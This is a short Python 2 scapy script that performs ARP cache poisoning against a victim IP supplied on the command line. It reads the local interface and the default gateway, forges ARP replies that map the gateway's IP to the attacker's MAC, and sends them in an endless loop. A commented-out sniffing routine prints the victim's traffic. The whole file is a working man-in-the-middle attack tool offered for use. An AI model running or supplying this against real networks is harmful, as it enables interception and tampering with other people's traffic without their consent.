import netifaces
import socket
from scapy.all import *
import sys
import time

if len(sys.argv) != 2:
    print "Who is target?"
    sys.exit(1)

def filt(pkt):
	ipLayer = pkt.getlayer("IP")
	if ipLayer != None:
		if ipLayer.src == victimIP or ipLayer.dst == victimIP:
			print pkt.summary() 
def stopfilt(pkt):
	return 1
		
ifName = netifaces.interfaces()
ifName = ifName[1]

ifInfo = netifaces.ifaddresses(ifName)
ifMAC = ifInfo[17][0]['addr']
ifIP = ifInfo[2][0]['addr']

print "[*] My Interface Name : ", ifName
print "[*] My IP : ",ifIP 
print "[*] My MAC : ",ifMAC

gateInfo = netifaces.gateways()
gateIP = gateInfo['default'][2][0]
print "[*] Gateway Info : ", gateInfo
print "[*] Gateway IP : ", gateIP

victimIP = sys.argv[1]
broadIP = ifIP.replace("."+ifIP.split(',')[-1], '')+".255"
packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=gateIP,pdst=victimIP)
h=ARP()
h.psrc=(gateIP)
h.pdst=(victimIP)
print ifMAC
h.hwsrc=(ifMAC)
h.show()
print "[*] Poisoning..."
send(h, verbose=0, inter=1, loop=1)
#sendp(packet, verbose=0, inter=1, loop=1)
#sniff(prn=filt, stop_filter=stopfilt)
	
